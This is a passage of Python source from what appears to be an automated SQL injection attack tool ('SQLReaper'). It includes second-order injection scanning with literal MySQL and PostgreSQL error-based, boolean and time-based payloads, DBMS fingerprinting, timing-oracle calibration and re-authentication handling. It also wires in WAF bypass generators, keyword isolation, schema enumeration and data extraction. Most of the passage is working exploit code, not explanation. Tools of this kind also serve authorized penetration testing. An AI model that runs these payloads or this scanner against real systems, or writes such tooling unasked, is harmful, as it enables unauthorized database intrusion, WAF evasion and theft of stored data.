                    _send_injected(engine, method, url, data, data_fmt,
                        param, original + probe_val, tamper_chain),
                    timeout=10)
                if fp:
                    # WAF block detection
                    if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) in (403, 406, 429, 503):
                        _waf_blocks += 1
                        continue
                    # Server error = SQL processing
                    if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) >= 500:
                        _errors += 1
                    # Body diff check
                    if fp.body:
                        _norm = ResponseNormaliser.normalise(_extract_body_safe(fp)) if _validate_response(fp, allow_empty=True) else b""
                        _sim = SimHasher.body_similarity(_norm_base, _norm) if _norm_base else 1.0
                        if _sim < 0.95:
                            _diffs += 1
                    # Timing diff check
                    if hasattr(fp, 'elapsed_ms') and fp.elapsed_ms:
                        if not _base_time:
                            _base_time = fp.elapsed_ms
                        elif fp.elapsed_ms > _base_time * 2.5:
                            _timing_diff = True
            except Exception:
                pass
        
        if _waf_blocks >= 2:
            return "waf_blocked"  # WAF is processing this param  worth testing with bypasses
        if _errors >= 1:
            return "sql_likely"   # Server error on SQL probe = likely processing
        if _timing_diff:
            return "sql_likely"   # Timing anomaly on SQL probe
        if _diffs >= 2:
            return "sql_likely"
        if _diffs == 0 and _waf_blocks == 0:
            return "static"
        return "unknown"


#  6. Response Distribution Fingerprinting (enhanced: headers, IQR, body hash) 
class ResponseDistributionProfiler:
    """Build statistical model of server's natural response variance."""
    
    @staticmethod
    async def profile(engine, method, url, data, data_fmt, param, original,
                       tamper_chain, n_samples: int = 8) -> dict:
        sizes = []
        timings = []
        statuses = []
        _header_sets = []
        _body_hashes = []
        
        for _ in range(n_samples):
            try:
                fp = await asyncio.wait_for(
                    _send_injected(engine, method, url, data, data_fmt,
                        param, original, tamper_chain),
                    timeout=15)
                if fp:
                    sizes.append(len(_extract_body_safe(fp)) if fp.body else 0)
                    timings.append(fp.elapsed_ms if hasattr(fp, 'elapsed_ms') else 0)
                    statuses.append(fp.status_code)
                    # Track response headers for fingerprinting
                    if hasattr(fp, 'headers') and fp.headers:
                        _header_sets.append(set(fp.headers.keys()) if isinstance(fp.headers, dict) 
                                           else set())
                    # FIX-5: Track body structure hash (first 500 bytes) with type validation
                    if fp.body:
                        if isinstance(fp.body, bytes):
                            _body_hashes.append(hash(_extract_body_safe(fp)[:500]))
                        elif isinstance(fp.body, str):
                            # BUG-FIX-3: Safe decode operation
                            try:
                                _body_hashes.append(hash(_safe_decode_body(fp)[:500]))  # _safe_decode_body returns str
                            except (UnicodeDecodeError, AttributeError, TypeError):
                                pass  # Fallback: skip this hash on decode failure
            except Exception:
                pass
        
        if len(sizes) < 3:
            return {"valid": False}
        
        # Use IQR for robust outlier detection (not affected by extreme values)
        _sorted_sizes = sorted(sizes)
        _sorted_times = sorted(timings)
        _q1_size = _sorted_sizes[len(_sorted_sizes) // 4]
        _q3_size = _sorted_sizes[3 * len(_sorted_sizes) // 4]
        _iqr_size = max(_q3_size - _q1_size, 1.0)
        _q1_time = _sorted_times[len(_sorted_times) // 4]
        _q3_time = _sorted_times[3 * len(_sorted_times) // 4]
        _iqr_time = max(_q3_time - _q1_time, 10.0)
        
        # Detect if page is dynamic (many different body hashes)
        _unique_hashes = len(set(_body_hashes))
        _is_dynamic = _unique_hashes > len(_body_hashes) * 0.5
        
        return {
            "valid": True,
            "size_median": _sorted_sizes[len(_sorted_sizes) // 2],
            "size_iqr": _iqr_size,
            "size_q1": _q1_size, "size_q3": _q3_size,
            "timing_median": _sorted_times[len(_sorted_times) // 2],
            "timing_iqr": _iqr_time,
            "timing_q1": _q1_time, "timing_q3": _q3_time,
            "status_mode": max(set(statuses), key=statuses.count) if statuses else 200,
            "is_dynamic": _is_dynamic,
            "n_samples": len(sizes),
            "header_stability": len(set(frozenset(h) for h in _header_sets)) <= 2 if _header_sets else True,
        }
    
    @staticmethod
    def is_anomalous(profile: dict, response_size: int, response_time: float,
                      iqr_multiplier: float = 2.5) -> tuple:
        """IQR-based outlier detection. Returns (is_anomalous, size_score, time_score)."""
        if not profile.get("valid"):
            return False, 0.0, 0.0
        _s_low = profile["size_q1"] - iqr_multiplier * profile["size_iqr"]
        _s_high = profile["size_q3"] + iqr_multiplier * profile["size_iqr"]
        _t_low = profile["timing_q1"] - iqr_multiplier * profile["timing_iqr"]
        _t_high = profile["timing_q3"] + iqr_multiplier * profile["timing_iqr"]
        _size_out = response_size < _s_low or response_size > _s_high
        _time_out = response_time < _t_low or response_time > _t_high
        _s_score = abs(response_size - profile["size_median"]) / max(profile["size_iqr"], 1)
        _t_score = abs(response_time - profile["timing_median"]) / max(profile["timing_iqr"], 1)
        return (_size_out or _time_out), _s_score, _t_score


#  7. Second-Order Injection Scanner (enhanced: multi-payload, timing, crawl) 
class SecondOrderScanner:
    """Inject into param A, trigger at endpoint B, detect stored SQLi."""
    
    TRIGGER_PATHS = [
        "/profile", "/account", "/settings", "/admin", "/dashboard",
        "/search", "/export", "/report", "/api/me", "/api/user",
        "/users", "/logs", "/audit", "/activity",
    ]
    
    # Multiple payload types for better coverage
    PAYLOADS = {
        "error_mysql": "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x716b7871,(SELECT @@version),0x7162707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -",
        "error_pg": "' AND 1=CAST((SELECT version()) AS INTEGER)-- -",
        "boolean_true": "' AND '1'='1",
        "boolean_false": "' AND '1'='2",
        "time_mysql": "' AND SLEEP(3)-- -",
        "time_pg": "' AND pg_sleep(3)-- -",
    }
    
    MARKERS = ["qkxq", "qbpxq", "you have an error in your sql",
               "syntax error", "ora-0", "incorrect syntax",
               "invalid input syntax", "sqlite3.operationalerror"]
    
    def __init__(self, engine, config):
        self._engine = engine
        self._config = config
    
    async def scan(self, inject_method, inject_url, inject_data, inject_fmt,
                    param, original, tamper_chain, trigger_urls=None) -> list:
        results = []
        _base = urlparse(inject_url)
        _triggers = trigger_urls or [f"{_base.scheme}://{_base.netloc}{p}" for p in self.TRIGGER_PATHS]
        
        # Get baselines for reachable triggers
        _baselines = {}
        for turl in _triggers[:10]:
            try:
                fp = await asyncio.wait_for(self._engine.send("GET", turl), timeout=8)
                if _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) < 404:
                    _baselines[turl] = (
                        _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction").lower() if fp.body else "",
                        fp.elapsed_ms if hasattr(fp, 'elapsed_ms') else 0)
            except Exception:
                pass
        
        if not _baselines:
            print("[*] [2ndOrder] No reachable trigger endpoints found", flush=True)
            return results
        
        print(f"[*] [2ndOrder] {len(_baselines)} trigger endpoints reachable, "
              f"testing {len(self.PAYLOADS)} payload types...", flush=True)
        
        for pname, payload in self.PAYLOADS.items():
            if results:
                break
            # Inject
            try:
                await _send_injected(self._engine, inject_method, inject_url,
                    inject_data, inject_fmt, param, original + payload, tamper_chain)
            except Exception:
                continue
            
            await asyncio.sleep(1.5)
            
            # Check triggers
            for turl, (bl_body, bl_time) in _baselines.items():
                try:
                    fp2 = await asyncio.wait_for(self._engine.send("GET", turl), timeout=10)
                    if not fp2:
                        continue
                    body2 = _safe_decode_body(fp2, encoding="utf-8", errors='replace', func_name='extraction_fp2').lower() if fp2.body else ""
                    
                    # Error detection
                    if "error" in pname:
                        for marker in self.MARKERS:
                            if marker in body2 and marker not in bl_body:
                                print(f"[+] [2ndOrder] Error leaked at {urlparse(turl).path} "
                                      f"via {pname} (marker: {marker[:30]})", flush=True)
                                results.append(DetectionResult(
                                    param=f"2nd:{param}->{urlparse(turl).path}",
                                    technique="E", payload=payload, dbms="", confidence=0.80,
                                    notes=f"second_order trigger={turl} payload_type={pname}"))
                                break
                    
                    # Boolean detection (response differs between true/false)
                    if pname == "boolean_true" and "boolean_false" in self.PAYLOADS:
                        # Will be compared on next iteration
                        _baselines[turl] = (body2, fp2.elapsed_ms if hasattr(fp2, 'elapsed_ms') else 0)
                    
                    # Timing detection
                    if "time" in pname and hasattr(fp2, 'elapsed_ms'):
                        if fp2.elapsed_ms > bl_time + 2500:
                            print(f"[+] [2ndOrder] Timing anomaly at {urlparse(turl).path} "
                                  f"via {pname} ({fp2.elapsed_ms:.0f}ms vs baseline {bl_time:.0f}ms)", flush=True)
                            results.append(DetectionResult(
                                param=f"2nd:{param}->{urlparse(turl).path}",
                                technique="T", payload=payload, dbms="", confidence=0.70,
                                notes=f"second_order_timing trigger={turl} elapsed={fp2.elapsed_ms:.0f}ms"))
                            break
                except Exception:
                    pass
        
        if not results:
            print(f"[*] [2ndOrder] No stored injection detected at {len(_baselines)} endpoints", flush=True)
        return results


#  8. Smart DBMS Elimination (enhanced: error fingerprinting, Bayesian) 
class DBMSEliminator:
    """Bayesian DBMS elimination with error fingerprint learning."""
    
    # Error patterns that positively identify a DBMS
    DBMS_FINGERPRINTS = {
        "MySQL": ["mysql", "mariadb", "error 1064", "error 1045", "mysqlnd"],
        "PostgreSQL": ["postgresql", "pg_", "error:  syntax", "psycopg"],
        "MSSQL": ["microsoft sql", "mssql", "sqlserver", "msg 156", "msg 105"],
        "Oracle": ["oracle", "ora-0", "tns:", "plsql"],
        "SQLite": ["sqlite", "sqlite3", "no such table"],
    }
    
    def __init__(self):
        self._scores: Dict[str, float] = {}
        self._tested: Dict[str, int] = {}
        self._confirmed_dbms: Optional[str] = None
        self._fingerprint_hits: Dict[str, int] = {}
    
    # TECHNIQUE-25: Bayesian DBMS Elevation from WAF Block Signatures (L4/L5).
    # WAF aggressively blocking DBMS-X syntax is STRONG evidence target IS DBMS-X.
    WAF_BLOCK_DBMS_SIGNALS = {
        'EXTRACTVALUE':   'MySQL',   'UPDATEXML':     'MySQL',
        'GROUP_CONCAT':   'MySQL',   'BENCHMARK':     'MySQL',
        'SLEEP(':         'MySQL',
        'PG_SLEEP':       'PostgreSQL', 'STRING_AGG':    'PostgreSQL',
        'PG_TABLES':      'PostgreSQL', '::INT':         'PostgreSQL',
        '::TEXT':         'PostgreSQL', 'CURRENT_SCHEMA()': 'PostgreSQL',
        'WAITFOR':        'MSSQL',   'FOR XML PATH':  'MSSQL',
        'STUFF(':         'MSSQL',   'DB_NAME()':     'MSSQL',
        'DBMS_PIPE':      'Oracle',  'UTL_INADDR':    'Oracle',
        'XMLTYPE(':       'Oracle',  'CTXSYS':        'Oracle',
        'FROM DUAL':      'Oracle',
        'RANDOMBLOB':     'SQLite',  'SQLITE_MASTER': 'SQLite',
    }

    def record_result(self, dbms: str, found: bool, technique: str = ""):
        self._tested[dbms] = self._tested.get(dbms, 0) + 1
        if found:
            self._scores[dbms] = self._scores.get(dbms, 0) + 3.0
            self._confirmed_dbms = dbms
        else:
            self._scores[dbms] = self._scores.get(dbms, 0) - 0.15

    def record_waf_block(self, dbms: str, payload: str = "") -> None:
        """BUG-V190-006 FIX + TECHNIQUE-25: WAF blocking DBMS-X syntax is
        POSITIVE evidence target IS DBMS-X — elevate, do not penalize.
        Also infer implied DBMS from blocked payload keyword content (TECHNIQUE-25).
        Numeric safety: only modifies float scores; no SQL payloads affected.
        """
        if dbms:
            # WAF has rules for DBMS-X → target likely runs DBMS-X.
            self._scores[dbms] = self._scores.get(dbms, 0.5) + 0.40
        if payload:
            _upper = payload.upper()
            for _kw, _implied in self.WAF_BLOCK_DBMS_SIGNALS.items():
                if _kw.upper() in _upper:
                    if _implied != dbms:
                        self._scores[_implied] = self._scores.get(_implied, 0.5) + 0.25
                    break

    def record_error_fingerprint(self, response_body: str):
        """Analyze response for DBMS-identifying error patterns."""
        if not response_body:
            return
        _body = response_body.lower()
        for dbms, patterns in self.DBMS_FINGERPRINTS.items():
            for pat in patterns:
                if pat in _body:
                    self._fingerprint_hits[dbms] = self._fingerprint_hits.get(dbms, 0) + 1
                    # Strong positive signal  boost this DBMS
                    self._scores[dbms] = self._scores.get(dbms, 0) + 1.0
    
    def get_order(self, original_order: list) -> list:
        if self._confirmed_dbms:
            _others = [d for d in original_order if d != self._confirmed_dbms][:2]
            return [self._confirmed_dbms] + _others
        
        # Prioritize fingerprint-identified DBMSes
        if self._fingerprint_hits:
            _fp_best = max(self._fingerprint_hits, key=self._fingerprint_hits.get)
            if self._fingerprint_hits[_fp_best] >= 2:
                _rest = [d for d in original_order if d != _fp_best]
                return [_fp_best] + _rest
        
        # Eliminate DBMSes tested 3+ times with negative score
        _eliminated = {d for d, t in self._tested.items() 
                       if t >= 3 and self._scores.get(d, 0) < 0}
        if _eliminated:
            _filtered = [d for d in original_order if d not in _eliminated]
            if _filtered:
                return _filtered
        return original_order
    
    def summary(self) -> str:
        if self._confirmed_dbms:
            return f"confirmed={self._confirmed_dbms}"
        if self._fingerprint_hits:
            return f"fingerprints={dict(self._fingerprint_hits)}"
        _elim = [d for d, t in self._tested.items() if t >= 3 and self._scores.get(d, 0) < 0]
        return f"eliminated={_elim}" if _elim else "learning"


#  9. Auth-Loss Detection (enhanced: cookie tracking, proactive check) 
class AuthLossDetector:
    """Monitor responses for authentication loss with cookie tracking."""
    
    AUTH_LOSS_PATTERNS = [
        "session expired", "session timeout", "please log in",
        "please sign in", "login required", "authentication required",
        "unauthorized", "access denied", "token expired",
        "jwt expired", "invalid token", "not authenticated",
    ]
    
    def __init__(self):
        self._auth_ok_status: Optional[int] = None
        self._auth_ok_size: Optional[int] = None
        self._auth_cookies: Dict[str, str] = {}  # track session cookies
        self._consecutive_auth_loss = 0
        self._total_auth_loss = 0
        self._reauth_callback = None
        self._last_check_time = 0.0
        self._proactive_interval = 300  # check every 5 min proactively
    
    def set_baseline(self, status: int, size: int):
        self._auth_ok_status = status
        self._auth_ok_size = size
    
    def set_reauth_callback(self, callback):
        self._reauth_callback = callback
    
    def track_cookies(self, headers):
        """Track Set-Cookie headers for session monitoring."""
        if not headers:
            return
        _sc = headers.get("set-cookie") or headers.get("Set-Cookie") or ""
        if _sc:
            for part in _sc.split(","):
                if "=" in part:
                    name = part.split("=")[0].strip()
                    if any(k in name.lower() for k in ["session", "token", "auth", "jwt", "sid"]):
                        self._auth_cookies[name] = part.strip()
    
    def should_proactive_check(self) -> bool:
        """Check if enough time passed for proactive auth verification."""
        return time.monotonic() - self._last_check_time > self._proactive_interval
    
    async def check(self, fp, url: str) -> bool:
        # FIX-BUG-1: Use comprehensive validation
        if not _validate_response(fp, allow_empty=True):
            return False
        
        self._last_check_time = time.monotonic()
        
        # Track cookies
        if hasattr(fp, 'headers') and fp.headers:
            self.track_cookies(fp.headers)
        
        # Redirect to login
        if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) in (301, 302, 303, 307, 308):
            _loc = ""
            if hasattr(fp, 'headers') and fp.headers:
                _loc = (getattr(fp, "headers", {}) or {}).get("location", "") or (getattr(fp, "headers", {}) or {}).get("Location", "")
            if _loc and any(k in _loc.lower() for k in ["login", "signin", "auth", "sso"]):
                self._consecutive_auth_loss += 1
                self._total_auth_loss += 1
                if self._consecutive_auth_loss >= 3:
                    await self._handle_auth_loss(url)
                return True
        
        # 401/403 after previously getting 200
        if fp and _validate_response(fp, allow_empty=True) and _get_safe_status_code(fp) in (401, 403) and self._auth_ok_status and self._auth_ok_status < 400:
            self._consecutive_auth_loss += 1
            self._total_auth_loss += 1
            if self._consecutive_auth_loss >= 3:
                await self._handle_auth_loss(url)
            return True
        
        # Body pattern check
        if fp.body:
            body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction").lower()
            if any(p in body for p in self.AUTH_LOSS_PATTERNS):
                if self._auth_ok_size and len(_extract_body_safe(fp)) < self._auth_ok_size * 0.3:
                    self._consecutive_auth_loss += 1
                    self._total_auth_loss += 1
                    if self._consecutive_auth_loss >= 3:
                        await self._handle_auth_loss(url)
                    return True
        
        self._consecutive_auth_loss = 0
        return False
    
    async def _handle_auth_loss(self, url: str):
        print(f"[!] [Auth]  Authentication lost ({self._consecutive_auth_loss} consecutive, "
              f"{self._total_auth_loss} total) ", flush=True)
        if self._reauth_callback:
            try:
                print("[*] [Auth] Re-authenticating...", flush=True)
                await self._reauth_callback()
                self._consecutive_auth_loss = 0
                print("[+] [Auth] Re-authentication successful  resuming", flush=True)
            except Exception as e:
                print(f"[!] [Auth] Re-authentication failed: {e}", flush=True)
        else:
            print("[!] [Auth] No re-auth callback  waiting 30s", flush=True)
            await asyncio.sleep(30)
            self._consecutive_auth_loss = 0


#  10. Timing Oracle Auto-Calibration (enhanced: warmup, P95, jitter-aware) 
class TimingOracleCalibrator:
    """Auto-calibrate SLEEP duration using P95 percentile and warmup."""
    
    @staticmethod
    async def calibrate(engine, method, url, data, data_fmt, param, original,
                         tamper_chain, min_sleep: float = 1.0,
                         max_sleep: float = 10.0) -> float:
        # Warmup: discard first 2 requests (cold-start bias from TCP, TLS, connection pool)
        for _ in range(2):
            try:
                await asyncio.wait_for(
                    _send_injected(engine, method, url, data, data_fmt,
                        param, original, tamper_chain), timeout=15)
            except Exception:
                pass
            await asyncio.sleep(0.05)
        
        # Measure 21 samples (after warmup) — need >20 for P95 to be below the max
        timings = []
        for _ in range(21):
            try:
                fp = await asyncio.wait_for(
                    _send_injected(engine, method, url, data, data_fmt,
                        param, original, tamper_chain), timeout=15)
                if fp and hasattr(fp, 'elapsed_ms'):
                    timings.append(fp.elapsed_ms)
            except Exception:
                pass
            await asyncio.sleep(0.1)
        
        if len(timings) < 4:
            print(f"[*] [TimingCal] Insufficient samples ({len(timings)})  default {max(min_sleep, 2.0)}s", flush=True)
            return max(min_sleep, 2.0)
        
        _sorted = sorted(timings)
        _median = _sorted[len(_sorted) // 2]
        # P95: 95th percentile  captures jitter ceiling
        _p95_idx = int(len(_sorted) * 0.95)
        _p95 = _sorted[min(_p95_idx, len(_sorted) - 1)]
        # IQR for robust spread
        _q1 = _sorted[len(_sorted) // 4]
        _q3 = _sorted[3 * len(_sorted) // 4]
        _iqr = _q3 - _q1
        
        # Sleep must produce delay > P95 + 3IQR to be distinguishable
        _min_detectable = (_p95 + _iqr * 3.0) / 1000.0
        _calibrated = max(min_sleep, min(max_sleep, _min_detectable + 0.5))

        # BUG-TIMINGCAL-CDN-ZERO FIX: When all baseline probes are served from CDN
        # cache, elapsed_ms is sub-millisecond (rounds to 0).  The calibration then
        # yields optimal SLEEP=1.0s (the minimum) for the wrong reason — CDN edge
        # speed rather than backend server speed.  Injection payloads contain SQL
        # keywords that break CDN cacheability, so they hit the backend and return
        # in 150-500ms while the baseline returns in 0ms.  The calibrated 1.0s sleep
        # is still technically correct (1000ms >> 200ms backend), but the output is
        # misleading ("median=0ms") and confuses users into thinking timing calibration
        # failed.  Jitter profiler corrects the final time_sec, but this warning
        # explains what happened during TimingCal.
        if _p95 < 50:  # all samples < 50ms → CDN is caching baseline requests
            print(f"[!] [TimingCal] CDN-cached baseline (P95={_p95:.1f}ms < 50ms) — "
                  "baseline probes served from edge cache.  Injection payloads bypass "
                  "CDN cache and hit backend directly.  Jitter profiler will refine "
                  "sleep estimate against real backend latency.", flush=True)

        print(f"[+] [TimingCal] Baseline: median={_median:.0f}ms P95={_p95:.0f}ms IQR={_iqr:.0f}ms  "
              f"optimal SLEEP={_calibrated:.1f}s", flush=True)
        return _calibrated


# 15.  WIRE ALL v19 COMPONENTS INTO SCANNERVFINAL
# 

class ScannerVFinal(ScannerV15):
    """
    v19 scanner: ScannerV15 + all novel v19 components wired in.

    New behaviours:
      - TemporalAnomalyDetector replaces naive timing thresholds
      - WassersteinResponseOracle used as secondary boolean oracle
      - MultiArmedBanditTechSelector replaces static TechniquePriorityQueue
      - BloomPayloadFilter prevents re-testing seen payloads
      - InjectionBoundarySweeper classifies context before probing
      - CacheLayerTimingProbe gates time-based techniques
      - PoCVerifier runs after every confirmed finding
      - CVSSv4AutoScorer adds CVSS scores to report
      - MarkdownNarrativeReporter generates MD report alongside JSON
      - WAFMLBypassGenerator augments evolution engine when WAF is ML-based
      - ConfidenceCalibrator post-processes all confidence scores
      - ParallelChunkedExtractorV2 replaces blind_extract_string for long values
    """

    def __init__(self, session: ScanSession, reporter: Reporter,
                 proxy_pool=None):
        super().__init__(session, reporter, proxy_pool=proxy_pool)
        # CRITICAL FIX: Initialize engine and tamper_chain attributes
        # These are set during scan execution but must exist to prevent AttributeError
        # if accessed before initialization (e.g., in extraction code)
        self.engine = None
        self.tamper_chain = []
        
        self._bandit = MultiArmedBanditTechSelector()
        self._bloom = BloomPayloadFilter(capacity=200_000, fp_rate=0.001)
        # BUG-DEAD-KEYWORD-ISO FIX (Req 15): Wire KeywordIsolationEngine — was defined but never
        # instantiated. Identifies which specific SQL keyword triggers the WAF and returns targeted
        # bypasses. Used in _try_with_bypass_cascade when WAF is detected during scanning.
        self._keyword_isolator = KeywordIsolationEngine()
        self._calibrator = ConfidenceCalibrator()
        # BUG-DEAD-INJ-VERIFY FIX (Req 15): Wire InjectionVerificationProbe — was defined but
        # never instantiated. Sends known-false conditions after confirmation to validate the
        # oracle is truly boolean-sensitive, not a dynamic page producing random diffs.
        self._injection_verifier = InjectionVerificationProbe()
        self._wasserstein = WassersteinResponseOracle()
        # BUG-DEAD-HDR-DIFF FIX (Req 15): Wire HeaderDiffOracle — was defined but never
        # instantiated. Uses response header differences as a boolean oracle, immune to
        # dynamic page content (A/B tests, CSRF tokens, ads). Supplements body-diff PCV.
        self._header_diff_oracle = HeaderDiffOracle()
        # BUG-V28-1 FIX (Req 15): ScanTimeEstimator was defined but never instantiated.
        # BUG-7 (v26) wired KeywordIsolationEngine, InjectionVerificationProbe, and
        # HeaderDiffOracle but missed ScanTimeEstimator. grep 'ScanTimeEstimator()'
        # returns zero hits across the entire file — it was dead code despite being defined.
        # ScanTimeEstimator provides per-technique time-budget estimates used by adaptive
        # scheduling; without it callers that do getattr(self, '_scan_time_estimator', None)
        # always get None → time budgeting silently disabled for all technique scheduling.
        self._scan_time_estimator = ScanTimeEstimator()
        self._temporal = TemporalAnomalyDetector()
        self._trigram = TrigramWAFPredictor()
        # WAFMLBypassGenerator: instantiated with a placeholder baseline;
        # wired to the live engine in _v14_init after the engine opens.
        self._waf_ml_bypass: Optional[WAFMLBypassGenerator] = None
        # Oracle mode + rolling baseline  set by SafeModeVerifier in _v14_init
        self._rolling_baseline = RollingBaseline()
        self._oracle_mode: OracleMode = OracleMode.FULL
        # Override TechniqueCascadeEngine creation to inject bandit + bloom
        self._v19_scan_count = 0  # track params scanned this session
        #  Session 3 enhancements (1-10) 
        self._session_persist = ScanSessionPersistence(
            getattr(self.config, 'output_dir', 'output'))
        self._rate_calibrator = RateLimitCalibrator()
        self._param_classifier = ParameterClassifier()
        self._dbms_eliminator = DBMSEliminator()
        self._auth_detector = AuthLossDetector()
        self._timing_calibrated = False
        self._response_profiles: Dict[str, dict] = {}  # param  distribution profile
        # ── BUG-R15-1 FIX (Req 15): SchemaEnumeratorV18 was defined at line ~106063
        # but NEVER instantiated anywhere in the codebase. It enriches enumeration
        # with V18-level bypass capability (versioned comments, null-byte tricks, etc.)
        # and is called by _run_enumeration when the standard enumerator yields no results.
        #
        # BUG-INIT-SCHEMA-V18 (v48): SchemaEnumeratorV18.__init__ requires 11 mandatory
        # positional args (engine, config, result, dbms, method, url, data, data_fmt,
        # original, tamper_chain, baseline).  None of these are available at scanner
        # construction time — they are only known once an injection is confirmed.
        # SchemaEnumeratorV18 is a per-scan contextual object, not a scanner-level
        # singleton.  The calling code at _run_enumeration (line ~33503) already handles
        # None via: _schema_v18 = getattr(self, '_schema_enum_v18', None) and only
        # proceeds if _schema_v18 is not None — so storing None is correct here.
        # The object is instantiated with real args at the call site when needed.
        self._schema_enum_v18 = None  # BUG-INIT-SCHEMA-V18 FIX: lazy-init at call site
        # ── BUG-R15-2 FIX (Req 15): Rate429Monitor was defined at line ~2418 but never
        # instantiated. Tracks HTTP 429/503 rate-limit responses per surface to adaptively
        # throttle probes before requests get blocked entirely (pre-emptive back-off).
        self._rate_429_monitor = Rate429Monitor()
        # ── BUG-R15-3 FIX (Req 15): ProgressTracker was defined at line ~2480 but never
        # instantiated. Provides real-time estimated completion time and per-technique
        # probe counts visible in verbose mode.
        #
        # BUG-INIT-PROGRESS-TRACKER (v48): ProgressTracker.__init__(target_url, enabled)
        # requires target_url as a mandatory positional arg with no default value.
        # Fix: pass the config URL (available via self.config set by super().__init__).
        # Falls back to '' when URL not yet set; an empty URL produces a fixed progress
        # filename hash which is harmless (no collision risk at single-scan granularity).
        self._progress_tracker = ProgressTracker(
            getattr(self.config, 'url', None) or '')
        # ── BUG-R15-4 FIX (Req 15): AdaptiveExtractor was defined at line ~4936 but never
        # instantiated. Wraps the extraction oracle with adaptive retry logic and confidence
        # scoring, improving reliability on high-jitter targets.
        #
        # BUG-INIT-ADAPTIVE-EXTRACTOR (v48): AdaptiveExtractor.__init__(extractors: List)
        # requires extractors as a mandatory positional arg with no default value.
        # Fix: pass an empty list.  AdaptiveExtractor([]) is valid — the extractors list
        # can be populated later, and the instance serves as a named registry accessible
        # via _GLOBAL_ADAPTIVE_EXTRACTOR (wired at run() line ~116547).
        # extract_string() on an empty extractor list returns '' immediately (no loop
        # iterations), which is a correct no-op when no extractors have been registered.
        self._adaptive_extractor = AdaptiveExtractor([])  # BUG-INIT-ADAPTIVE-EXTRACTOR FIX
        # ── BUG-R15-5 FIX (Req 15): MultiOracleVoter was defined at line ~7106 but never
        # instantiated. Aggregates results from multiple boolean oracle sources (body-diff,
        # header-diff, status-code) using majority voting to reduce false positives.
        self._multi_oracle_voter = MultiOracleVoter()

    async def run(self):
        """Override to inject v19 pre/post processing around v15 scan."""
        # FIX-SYNTAX-GLOBAL: `global` declaration MUST precede any use of the declared
        # names in the same function scope.  The original code had `global DBMS_TECHNIQUE_MAP`
        # AFTER `if not DBMS_TECHNIQUE_MAP:` — a SyntaxError in Python 3.
        # Moved here to the very first line of the function body.
        global _SCAN_STOPPED, _EXTRACTION_STARTED, _EXTRACTION_TASK, _EXTRACTION_ACTIVE, _EXTRACTION_DONE, _EXTRACTION_SEMAPHORE, DBMS_TECHNIQUE_MAP
        # BUG-V39-9 FIX (Req 9/15): Removed `import time as _t_vf` inline.
        # `time` is already imported at module level (line ~1570).
        print(f"\n{'='*60}\n[SQLReaper v25] Scan starting {time.strftime('%H:%M:%S')} "
              f"url={getattr(self.config,'url','?')!r:.50}\n{'='*60}", flush=True)

        # BUG-R4-2 FIX: Reset module-level scan-control flags at scan start.
        # If the script is run multiple times in the same Python process (e.g.
        # test suites, --all-params re-entry, or an interactive shell), a True
        # value left from the previous run would block ALL probes from the very
        # first _send_injected call.  Reset unconditionally so each scan starts
        # clean.  _EXTRACTION_STARTED is also reset so extraction can claim
        # ownership again in the new scan.

        # FIX-REQ1-STARTUP: Force-populate CERTIFIED_PAYLOAD_DATABASE and
        # DBMS_TECHNIQUE_MAP at scan start.  The module-level _populate_certified_db()
        # call at the bottom of the file runs at import time.  However, if the import
        # succeeded but _populate_certified_db() silently failed (missing payload list
        # variable, NameError on a newly-added DBMS), CERTIFIED_PAYLOAD_DATABASE stays
        # empty and every get_dbms_payloads() call returns [] silently — the scan sends
        # zero probes and reports "no injection found" without any error.
        # This guard catches that silent failure and re-tries population here, where
        # the print() output will be visible to the operator.
        if not CERTIFIED_PAYLOAD_DATABASE:
            try:
                print("[!] [REQ1] CERTIFIED_PAYLOAD_DATABASE was empty at scan start — "
                      "re-running _populate_certified_db() now (should not happen on normal start)",
                      flush=True)
                _populate_certified_db()
                if CERTIFIED_PAYLOAD_DATABASE:
                    print(f"[+] [REQ1] CPDB populated: "
                          f"{len(CERTIFIED_PAYLOAD_DATABASE)} DBMSes", flush=True)
                else:
                    print("[!!] [REQ1] CRITICAL: _populate_certified_db() ran but CPDB is STILL empty. "
                          "Check that all MYSQL_*_PAYLOADS, POSTGRESQL_*_PAYLOADS etc. are defined "
                          "and not accidentally set to empty lists.", flush=True)
            except Exception as _cpdb_startup_err:
                print(f"[!!] [REQ1] CRITICAL: _populate_certified_db() failed at scan start: "
                      f"{_cpdb_startup_err}", flush=True)
        if not DBMS_TECHNIQUE_MAP:
            try:
                # BUG-2-FIX: _populate_technique_map() was undefined; correct function
                # is _ensure_technique_map_populated() (defined at line 62581).
                _ensure_technique_map_populated()
            except Exception as _dtm_startup_err:
                print(f"[!] [REQ1] DBMS_TECHNIQUE_MAP population error (non-fatal): "
                      f"{_dtm_startup_err}", flush=True)
        _SCAN_STOPPED[0] = False
        _INJECTION_CONFIRMED[0] = False  # BUG-4 FIX: must be reset or PCV gate skips all checks on re-use
        _EXTRACTION_STARTED[0] = False
        # BUG-EXTRACTIONSTOP-9 FIX (Req 5): ScannerVFinal.run() previously only reset
        # _SCAN_STOPPED, _INJECTION_CONFIRMED, and _EXTRACTION_STARTED, but NOT:
        #   _EXTRACTION_DONE   – marks extraction permanently claimed for this session
        #   _EXTRACTION_ACTIVE – marks extraction in-progress (bypasses _SCAN_STOPPED gate)
        #   _EXTRACTION_TASK   – holds the asyncio.Task reference
        #   _PCV_IN_PROGRESS   – integer counter for PCV sessions in flight
        #   _PCV_XCAT_DRAINED  – set of detection result ids already drained
        # In batch mode (multiple targets, same Python process), these flags left True/non-zero
        # from target-1 would permanently block extraction on target-2 (_EXTRACTION_DONE=True
        # causes _start_extraction_safely() to return False immediately for every confirmed
        # injection on target-2) and corrupt PCV counter logic (_PCV_IN_PROGRESS > 0 means
        # _send_injected forever bypasses _SCAN_STOPPED, firing probes on target-2 regardless
        # of whether injection was confirmed).
        _EXTRACTION_DONE[0]    = False    # BUG-EXTRACTIONSTOP-9 FIX
        _EXTRACTION_ACTIVE[0]  = False    # BUG-EXTRACTIONSTOP-9 FIX
        _EXTRACTION_TASK[0]    = None     # BUG-EXTRACTIONSTOP-9 FIX
